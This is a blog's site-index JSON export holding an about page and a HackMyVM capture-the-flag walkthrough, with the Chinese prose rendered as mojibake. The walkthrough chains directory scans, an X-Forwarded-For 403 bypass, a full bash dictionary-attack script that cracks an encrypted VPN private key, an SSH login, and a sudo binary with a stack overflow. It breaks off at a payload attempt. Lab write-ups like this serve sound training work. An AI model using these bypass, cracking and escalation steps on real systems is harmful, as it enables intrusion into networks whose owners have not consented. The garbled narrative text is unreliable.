
[{"content":"\rğŸ‘‹ å…³äºæœ¬ç«™ #\ræ¬¢è¿æ¥åˆ°æˆ‘çš„ç¬¬ä¸‰ä¸ªåšå®¢ï¼ğŸš€\nä¹‹å‰çš„æœåŠ¡å™¨è¿‡æœŸäº†ï¼Œè¿™æ¬¡æˆ‘å†³å®šä» WordPress è½¬å‘æ›´è½»é‡ã€å¯æ§çš„ Hugo âš™ï¸\nä¸»é¢˜é‡‡ç”¨çš„æ˜¯ Blowfishï¼Œå¹¶æ ¹æ®è‡ªå·±çš„éœ€æ±‚åšäº†ä¸€äº›å®šåˆ¶ä¿®æ”¹ âœ¨\nğŸ§‘â€ğŸ’» Whoami #\rHYH\nğŸ“ ä¿¡æ¯å®‰å…¨ä¸“ä¸šåœ¨è¯»å¤§å­¦ç”Ÿ\nğŸ› ï¸ æŠ€èƒ½ç‚¹ï¼šWeb / Vue / SpringBoot / Android Compose\nğŸ“¬ è”ç³»æ–¹å¼ï¼š\nQQï¼š1659854684 Emailï¼š1659854684@qq.com / hyhforevertop@gmail.com ğŸ“š åšå®¢å†…å®¹ #\ræœ¬ç«™å°†ä¸“æ³¨åˆ†äº«ï¼š\nCTF / æ¸—é€é¢˜è§£ ğŸ§¨ å®æˆ˜ç¬”è®° ğŸ““ ç¼–ç¨‹å¼€å‘æŠ€å·§ï¼ˆå‰ç«¯ \u0026amp; Androidï¼‰ğŸ’» å¸Œæœ›å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¦‚æœå–œæ¬¢ï¼Œæ¬¢è¿ç•™è¨€æ”¯æŒ â¤ï¸\nğŸ“Œ æœ€è¿‘ #\rä¸€åˆ‡éƒ½ä¼šå¥½èµ·æ¥çš„ ğŸ™‚\nç»§ç»­è®°å½•ï¼Œç»§ç»­å‰è¡Œ âœï¸\n","date":"2025-05-25","externalUrl":null,"permalink":"/about/","section":"HYH's Blog","summary":"","title":"About","type":"page"},{"content":"","date":"2025-05-25","externalUrl":null,"permalink":"/","section":"HYH's Blog","summary":"","title":"HYH's Blog","type":"page"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/tags/hackmyvm/","section":"Tags","summary":"","title":"Hackmyvm","type":"tags"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/categories/hackmyvm/","section":"Categories","summary":"","title":"Hackmyvm","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/homelab â¯ nmap 192.168.55.41 -sV -A -p- PORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.62 ((Unix))\r|_http-favicon: Apache on Mac OS X\r|_http-title: Mac OS X Server\r| http-methods: |_ Potentially risky methods: TRACE\r|_http-server-header: Apache/2.4.62 (Unix) åªæœ‰80ç«¯å£å¼€æ”¾äº†\nDir Fuzz #\r[root@kali] /home/kali/homelab â¯ dirsearch -u http://192.168.55.41 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289\rTarget: http://192.168.55.41/\r[04:47:54] Scanning: [04:48:00] 200 - 820B - /cgi-bin/printenv [04:48:00] 200 - 1KB - /cgi-bin/test-cgi [04:48:01] 200 - 4KB - /error.html [04:48:01] 200 - 8KB - /favicon.ico [04:48:02] 200 - 5KB - /index.html [04:48:05] 301 - 313B - /script -\u0026gt; http://192.168.55.41/script/ [04:48:05] 403 - 276B - /script/\r[04:48:06] 301 - 314B - /service -\u0026gt; http://192.168.55.41/service/ [04:48:06] 301 - 319B - /service?Wsdl -\u0026gt; http://192.168.55.41/service/?Wsdl\r[04:48:06] 301 - 312B - /style -\u0026gt; http://192.168.55.41/style/ [04:48:10] 403 - 276B - /server-status/ [04:48:11] 403 - 276B - /server-status\rTask Completed [root@kali] /home/kali/homelab â¯ curl http://192.168.55.41/service/ Whoa! But sorry, this service is only available for myself!# çœ‹åˆ°æœ‰ä¸€ä¸ªserviceè·¯å¾„ï¼Œä½†æ˜¯å¥½åƒéœ€è¦è®¤è¯\nå°è¯•æ‰«æç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ªvpn.txtï¼Œä½†æ˜¯æ— æ³•è¯»å–\n[root@kali] /home/kali/homelab â¯ feroxbuster -u \u0026#39;http://192.168.55.41/service/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt --dont-filter -s 403 â\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.41/service/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\rğŸ‘Œ Status Codes â”‚ [403]\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ¤ª Filter Wildcards â”‚ false\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r403 GET 9l 28w 276c http://192.168.55.41/service/vpn.txt æ¢dirsearchæ‰«ä¸€ä¸‹\n[root@kali] /home/kali/homelab â¯ dirsearch -u http://192.168.55.41/service/\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289\rTarget: http://192.168.55.41/\r[04:56:21] Scanning: service/ [04:56:22] 403 - 276B - /service/.ht_wsr.txt [04:56:22] 403 - 276B - /service/.hta\r[04:56:22] 403 - 276B - /service/.htaccess\r[04:56:22] 403 - 276B - /service/.htaccess-dev\r[04:56:22] 403 - 276B - /service/.htaccess.bak\r[04:56:22] 403 - 276B - /service/.htaccess-marco\r[04:56:22] 403 - 276B - /service/.htaccess.bak1\r[04:56:22] 403 - 276B - /service/.htaccess.orig\r[04:56:22] 403 - 276B - /service/.htaccess.BAK\r[04:56:22] 403 - 276B - /service/.htaccess.old\r[04:56:22] 403 - 276B - /service/.htaccess.sample\r[04:56:22] 403 - 276B - /service/.htaccess.inc\r[04:56:22] 403 - 276B - /service/.htaccess-local\r[04:56:22] 403 - 276B - /service/.htaccess.txt\r[04:56:22] 403 - 276B - /service/.htaccess.save\r[04:56:22] 403 - 276B - /service/.htaccess/\r[04:56:22] 403 - 276B - /service/.htaccess_extra\r[04:56:22] 403 - 276B - /service/.htaccess_orig\r[04:56:22] 403 - 276B - /service/.htaccess_sc\r[04:56:22] 403 - 276B - /service/.htaccessBAK\r[04:56:22] 403 - 276B - /service/.htaccessOLD\r[04:56:22] 403 - 276B - /service/.htaccessOLD2\r[04:56:22] 403 - 276B - /service/.htaccess~ [04:56:22] 403 - 276B - /service/.htgroup\r[04:56:22] 403 - 276B - /service/.htm\r[04:56:22] 403 - 276B - /service/.html\r[04:56:22] 403 - 276B - /service/.htpasswd-old\r[04:56:22] 403 - 276B - /service/.htpasswd/\r[04:56:22] 403 - 276B - /service/.htpasswd.bak\r[04:56:22] 403 - 276B - /service/.htpasswd.inc\r[04:56:22] 403 - 276B - /service/.htpasswd\r[04:56:22] 403 - 276B - /service/.htpasswd_test\r[04:56:22] 403 - 276B - /service/.httr-oauth\r[04:56:22] 403 - 276B - /service/.htusers\r[04:56:22] 403 - 276B - /service/.htpasswds\r[04:56:27] 200 - 1KB - /service/ca.crt [04:56:29] 200 - 59B - /service/index.php [04:56:30] 200 - 59B - /service/index.php/login/ Task Completed å­˜åœ¨ä¸€ä¸ªca.crtçš„è¯ä¹¦æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿˜æœ‰å¯èƒ½å­˜åœ¨å…¶ä»–çš„è¯ä¹¦æ–‡ä»¶å‘¢ï¼Ÿ\n[root@kali] /home/kali/homelab â¯ feroxbuster -u \u0026#39;http://192.168.55.41/service/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x crt,key â\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.41/service/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [crt, key]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r404 GET 9l 31w 273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r403 GET 9l 28w 276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 1l 10w 59c http://192.168.55.41/service/\r200 GET 20l 22w 1200c http://192.168.55.41/service/ca.crt\r200 GET 84l 139w 4492c http://192.168.55.41/service/client.crt\r200 GET 30l 36w 1862c http://192.168.55.41/service/client.key\r[####################] - 29s 661638/661638 0s found:4 errors:0 [####################] - 28s 661638/661638 23331/s http://192.168.55.41/service/ å¯ä»¥çœ‹åˆ°æ‰«å‡ºæ¥ä¸‰ä¸ªæ–‡ä»¶ï¼Œç”±äºæ— æ³•ç›´æ¥åˆ©ç”¨ï¼Œä¹‹å‰åˆæ‰«åˆ°ä¸€ä¸ªvpn.txtï¼Œå°è¯•æ‰«æä¸€ä¸‹UDPç«¯å£\n[root@kali] /home/kali/homelab â¯ nmap 192.168.55.41 -sU -p 1194 PORT STATE SERVICE\r1194/udp open openvpn å¯ä»¥çœ‹åˆ°openvpnçš„ç«¯å£æ˜¯å¼€ç€çš„ï¼Œå¯ä»¥è”æƒ³åˆ°ä½¿ç”¨è¯ä¹¦æ–‡ä»¶è¿æ¥vpnåˆ°å†…éƒ¨ç½‘ç»œ\n403 Bypass #\rè¿˜æ˜¯å¾—çœ‹çœ‹vpn.txté‡Œçš„å†…å®¹ï¼Œè¿™é‡Œå°è¯•ä½¿ç”¨X-Forwared-Forå¤´è¿›è¡Œç»•è¿‡\nç›´æ¥ä½¿ç”¨127.0.0.1ä¸è¡Œï¼Œé‚£ä¹ˆè¿˜æ˜¯å¾—çˆ†ç ´ä¸€ä¸‹ï¼Œç”¨å½“å‰ç½‘å¡æ®µ\n[root@kali] /home/kali/homelab â¯ echo {0..255} \u0026gt; ip.txt [root@kali] /home/kali/homelab â¯ ffuf -u \u0026#39;http://192.168.55.41/service/\u0026#39; -H \u0026#39;X-Forwarded-For: 192.168.55.FUZZ\u0026#39; -w ip.txt -fs 59 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.55.41/service/\r:: Wordlist : FUZZ: /home/kali/homelab/ip.txt\r:: Header : X-Forwarded-For: 192.168.55.FUZZ\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 59\r________________________________________________\r41 [Status: 200, Size: 326, Words: 41, Lines: 22, Duration: 6ms] å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å€¼\nå…¶ä¸­æœ‰ä¸€ä¸ªç”¨æˆ·åshinosawa\n[root@kali] /home/kali/homelab â¯ curl http://192.168.55.41/service/ -H \u0026#39;X-Forwarded-For: 192.168.55.41\u0026#39;\r# Last modified by shinosawa\r# on 2024-12-21\r# Example Configuration File\rclient\rdev tun\rproto udp\rremote ? ?\rresolv-retry infinite\rnobind\rpersist-key\rpersist-tun\rca ?\rcert ?\r# Regenerate a STRONG password for the KEY\r# Do NOT use a SAME password as other services et. SSH\r# it is DANGEROUS!\rkey ?\rcipher AES-256-GCM\rverb 3 PKCS8 Brute #\rå…¶ä¸­çš„é—®å·ä¼¼ä¹å°±æ˜¯ç”¨ä¹‹å‰è·å¾—çš„ä¸œè¥¿æ¥æ›¿æ¢\nå½“ç„¶å¦‚æœä½ æ‰“è¿‡HTBï¼Œé‚£ä¹ˆå°±å¯¹openvpnçš„æ ¼å¼å°±æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œå¤§è‡´æ˜¯è¿™æ ·ï¼Œå°†å†…å®¹å¡«è¿›å»å°±è¡Œäº†\nOpenvpnå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶å‚æ•°è¯´æ˜clienté…ç½®æ–‡ä»¶-CSDNåšå®¢\nclient\rdev tun\rproto udp\rremote 192.168.55.41 1194\rresolv-retry infinite\rnobind\rpersist-key\rpersist-tun\r\u0026lt;ca\u0026gt;\r\u0026lt;/ca\u0026gt;\r\u0026lt;cert\u0026gt;\r\u0026lt;/cert\u0026gt;\r\u0026lt;key\u0026gt;\r\u0026lt;/key\u0026gt;\rcipher AES-256-GCM\rverb 3 ä¿å­˜åå°è¯•ä½¿ç”¨çš„è¯ï¼Œä¼šéœ€è¦è¾“å…¥å¯†ç ï¼ŒåŸå› å°±åœ¨äºclient.keyè®¾å®šäº†å¯†ç \nå› æ­¤å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥è¿›è¡Œçˆ†ç ´\n#!/bin/bash\r# ä¿®å¤ç‰ˆ OpenSSL ç§é’¥å­—å…¸æ”»å‡»è„šæœ¬\r# ç”¨æ³•: ./dict_attack.sh \u0026lt;åŠ å¯†ç§é’¥æ–‡ä»¶\u0026gt; \u0026lt;å­—å…¸æ–‡ä»¶\u0026gt;\r# é¢œè‰²å®šä¹‰\rRED=\u0026#39;\\033[0;31m\u0026#39;\rGREEN=\u0026#39;\\033[0;32m\u0026#39;\rNC=\u0026#39;\\033[0m\u0026#39; # æ— é¢œè‰²\r# æ£€æŸ¥å‚æ•°\rif [ $# -ne 2 ]; then\recho -e \u0026#34;${RED}é”™è¯¯: éœ€è¦ä¸¤ä¸ªå‚æ•°${NC}\u0026#34;\recho \u0026#34;ç”¨æ³•: $0 \u0026lt;åŠ å¯†ç§é’¥æ–‡ä»¶\u0026gt; \u0026lt;å­—å…¸æ–‡ä»¶\u0026gt;\u0026#34;\rexit 1\rfi\rKEY_FILE=\u0026#34;$1\u0026#34;\rDICT_FILE=\u0026#34;$2\u0026#34;\rDECRYPTED_KEY=\u0026#34;decrypted_$(date +%s).key\u0026#34;\r# æ£€æŸ¥æ–‡ä»¶\r[ -f \u0026#34;$KEY_FILE\u0026#34; ] || { echo -e \u0026#34;${RED}é”™è¯¯: å¯†é’¥æ–‡ä»¶ä¸å­˜åœ¨${NC}\u0026#34;; exit 1; }\r[ -f \u0026#34;$DICT_FILE\u0026#34; ] || { echo -e \u0026#34;${RED}é”™è¯¯: å­—å…¸æ–‡ä»¶ä¸å­˜åœ¨${NC}\u0026#34;; exit 1; }\r# æ£€æŸ¥ OpenSSL\rcommand -v openssl \u0026gt;/dev/null || { echo -e \u0026#34;${RED}é”™è¯¯: OpenSSL æœªå®‰è£…${NC}\u0026#34;; exit 1; }\r# è·å–å­—å…¸è¡Œæ•°\rTOTAL=$(wc -l \u0026lt; \u0026#34;$DICT_FILE\u0026#34;)\rCOUNT=0\rSTART=$(date +%s)\recho -e \u0026#34;ç›®æ ‡å¯†é’¥: $KEY_FILE\u0026#34;\recho -e \u0026#34;ä½¿ç”¨å­—å…¸: $DICT_FILE (å…± $TOTAL ä¸ªå¯†ç )\u0026#34;\recho -e \u0026#34;å¼€å§‹æ”»å‡»...\\n\u0026#34;\r# ä¸»å¾ªç¯\rwhile IFS= read -r PASS; do\r((COUNT++))\r# æ›´å®‰å…¨çš„è¿›åº¦è®¡ç®—ï¼ˆä¸ä½¿ç”¨bcï¼‰\rPERCENT=$((COUNT*100/TOTAL))\r# æ¯100æ¬¡æˆ–æœ€åä¸€è¡Œæ˜¾ç¤ºè¿›åº¦\rif [ $((COUNT % 100)) -eq 0 ] || [ $COUNT -eq $TOTAL ]; then\rprintf \u0026#34;è¿›åº¦: %3d%% (%d/%d) å½“å‰å¯†ç : %-20s\\r\u0026#34; $PERCENT $COUNT $TOTAL \u0026#34;$PASS\u0026#34;\rfi\r# å°è¯•è§£å¯†\rif openssl pkcs8 -in \u0026#34;$KEY_FILE\u0026#34; -out \u0026#34;$DECRYPTED_KEY\u0026#34; -passin \u0026#34;pass:$PASS\u0026#34; 2\u0026gt;/dev/null; then\recho -e \u0026#34;\\n\\n${GREEN}æˆåŠŸæ‰¾åˆ°å¯†ç : $PASS${NC}\u0026#34;\recho -e \u0026#34;${GREEN}è§£å¯†åçš„å¯†é’¥å·²ä¿å­˜åˆ°: $DECRYPTED_KEY${NC}\u0026#34;\r# éªŒè¯å¯†é’¥\recho -e \u0026#34;\\nå¯†é’¥ä¿¡æ¯:\u0026#34;\rif openssl rsa -in \u0026#34;$DECRYPTED_KEY\u0026#34; -noout -text 2\u0026gt;/dev/null | head -n 5; then\recho -e \u0026#34;${GREEN}å¯†é’¥éªŒè¯æˆåŠŸ!${NC}\u0026#34;\relse\recho -e \u0026#34;${RED}è­¦å‘Š: å¯†é’¥éªŒè¯å¤±è´¥${NC}\u0026#34;\rfi\rexit 0\rfi\rdone \u0026lt; \u0026#34;$DICT_FILE\u0026#34;\r# æ”»å‡»å¤±è´¥\recho -e \u0026#34;\\n\\n${RED}æ”»å‡»å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ­£ç¡®å¯†ç ${NC}\u0026#34;\recho -e \u0026#34;å·²å°è¯• $COUNT ä¸ªå¯†ç \u0026#34;\recho -e \u0026#34;è€—æ—¶: $(( $(date +%s) - $START )) ç§’\u0026#34;\rexit 1 å½“ç„¶è¿™é‡Œä¸ºäº†èŠ‚çœæ—¶é—´ï¼Œæˆ‘ç›´æ¥å°±æ¢äº†ä¸€ä¸ªå­—å…¸ğŸ˜‚\n[root@kali] /home/kali/homelab â¯ ./poc.sh client.key /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt â\rç›®æ ‡å¯†é’¥: client.key\rä½¿ç”¨å­—å…¸: /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt (å…± 1000000 ä¸ªå¯†ç )\rå¼€å§‹æ”»å‡»...\rè¿›åº¦: 2% (23600/1000000) å½“å‰å¯†ç : hobbs æˆåŠŸæ‰¾åˆ°å¯†ç : hiro\rè§£å¯†åçš„å¯†é’¥å·²ä¿å­˜åˆ°: decrypted_1747218048.key\rå¯†é’¥ä¿¡æ¯:\rPrivate-Key: (2048 bit, 2 primes)\rmodulus:\r00:a4:18:af:59:be:6f:36:31:64:7f:6b:60:da:ba:\rec:89:3e:10:7b:90:4c:99:1b:55:fe:d2:c1:77:8d:\r47:15:a9:59:f8:df:9c:48:ed:32:0a:2c:56:fa:00:\rå¯†é’¥éªŒè¯æˆåŠŸ! ç„¶åè¿æ¥ä¸Šå»\nUser #\rç”¨fscançœ‹çœ‹å…¶ä»–ä¸»æœºï¼Œé™¤äº†è‡ªå·±ï¼Œè¿˜æœ‰ä¸€ä¸ª10.8.0.1ï¼Œä¹Ÿå°±æ˜¯é¶æœºï¼Œä½†æ²¡ä»€ä¹ˆç”¨ã€‚\n[root@kali] /home/kali/Desktop â¯ ./fscan -h 10.8.0.0/24 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\râ”‚ ___ _ â”‚\râ”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚\râ”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚\râ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚\râ”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚\râ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\rFscan Version: 2.0.0\r[2025-05-14 08:24:06] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 [2025-05-14 08:24:06] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\r[2025-05-14 08:24:06] [INFO] CIDRèŒƒå›´: 10.8.0.0-10.8.0.255\r[2025-05-14 08:24:06] [INFO] ç”ŸæˆIPèŒƒå›´: 10.8.0.0.%!d(string=10.8.0.255) - %!s(MISSING).%!d(MISSING)\r[2025-05-14 08:24:06] [INFO] è§£æCIDR 10.8.0.0/24 -\u0026gt; IPèŒƒå›´ 10.8.0.0-10.8.0.255\r[2025-05-14 08:24:06] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\r[2025-05-14 08:24:06] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\r[2025-05-14 08:24:06] [SUCCESS] ç›®æ ‡ 10.8.0.2 å­˜æ´» (ICMP)\r[2025-05-14 08:24:06] [SUCCESS] ç›®æ ‡ 10.8.0.1 å­˜æ´» (ICMP)\r[2025-05-14 08:24:09] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 2\r[2025-05-14 08:24:09] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\r[2025-05-14 08:24:10] [SUCCESS] ç«¯å£å¼€æ”¾ 10.8.0.1:80 å›å¤´å†çœ‹ä¸€ä¸‹æ—¥å¿—ï¼Œå‘ç°å¦ä¸€ä¸ªip\nå†æ‰«ä¸€ä¸‹ä»–çš„ç½‘æ®µ\n[root@kali] /home/kali/Desktop â¯ ./fscan -h 10.176.13.0/24\râ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\râ”‚ ___ _ â”‚\râ”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚\râ”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚\râ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚\râ”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚\râ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\rFscan Version: 2.0.0\r[2025-05-14 08:31:47] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 [2025-05-14 08:31:47] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\r[2025-05-14 08:31:47] [INFO] CIDRèŒƒå›´: 10.176.13.0-10.176.13.255\r[2025-05-14 08:31:47] [INFO] ç”ŸæˆIPèŒƒå›´: 10.176.13.0.%!d(string=10.176.13.255) - %!s(MISSING).%!d(MISSING)\r[2025-05-14 08:31:47] [INFO] è§£æCIDR 10.176.13.0/24 -\u0026gt; IPèŒƒå›´ 10.176.13.0-10.176.13.255\r[2025-05-14 08:31:47] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\r[2025-05-14 08:31:47] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\r[2025-05-14 08:31:47] [SUCCESS] ç›®æ ‡ 10.176.13.37 å­˜æ´» (ICMP)\r[2025-05-14 08:31:50] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 1\r[2025-05-14 08:31:50] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\r[2025-05-14 08:31:50] [SUCCESS] ç«¯å£å¼€æ”¾ 10.176.13.37:22\r[2025-05-14 08:31:50] [SUCCESS] ç«¯å£å¼€æ”¾ 10.176.13.37:80\r[2025-05-14 08:31:50] [SUCCESS] æœåŠ¡è¯†åˆ« 10.176.13.37:22 =\u0026gt; [ssh] ç‰ˆæœ¬:9.9 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.9.]\r[2025-05-14 08:31:55] [SUCCESS] æœåŠ¡è¯†åˆ« 10.176.13.37:80 =\u0026gt; [http]\r[2025-05-14 08:31:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2 æ‰¾åˆ°ä¸€ä¸ªå­˜æ´»IPï¼š10.176.13.37ï¼Œä¹Ÿæ˜¯æŒ‡å‘é¶æœºï¼Œä½†æ˜¯å¤šäº†ä¸€ä¸ªsshç«¯å£å¼€æ”¾\nå°è¯•ä½¿ç”¨ä¹‹å‰åœ¨XFF Bypasséƒ¨åˆ†ä¸­è·å–åˆ°çš„ç”¨æˆ·åï¼Œå¯†ç ç”¨hiroæˆåŠŸç™»å½•\n[root@kali] /home/kali/homelab â¯ ssh shinosawa@10.176.13.37 â\rshinosawa@10.176.13.37\u0026#39;s password: homelab:~$ id\ruid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)\rhomelab:~$ Root #\ræŸ¥çœ‹sudo -l\nhomelab:~$ sudo -l\rMatching Defaults entries for shinosawa on homelab:\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rRunas and Command-specific defaults for shinosawa:\rDefaults!/usr/sbin/visudo env_keep+=\u0026#34;SUDO_EDITOR EDITOR VISUAL\u0026#34;\rUser shinosawa may run the following commands on homelab:\r(ALL) NOPASSWD: /home/shinosawa/deepseek æ‹–å‡ºæ¥çœ‹çœ‹ä¼ªä»£ç ï¼Œä¼¼ä¹æ˜¯ä¸€ä¸ªæ ˆæº¢å‡º\n__int64 vuln()\r{\rchar s[64]; // [rsp+0h] [rbp-40h] BYREF\rprintf(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;);\rfflush(stdout);\rfgets(s, 256, stdin);\rreturn typewriter_output();\r}\rvoid __noreturn execute()\r{\rputs(\u0026#34;[*] in execute()\u0026#34;);\rfflush(stdout);\rputs(\u0026#34;[*] running shell\u0026#34;);\rfflush(stdout);\rexecl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, 0LL);\rperror(\u0026#34;execl failed\u0026#34;);\rexit(1);\r} æˆ‘å°è¯•è¿‡è¿™ç§æ–¹å¼\nhomelab:~$ cat payload.bin | sudo /home/shinosawa/deepseek \u0026gt;\u0026gt;\u0026gt; 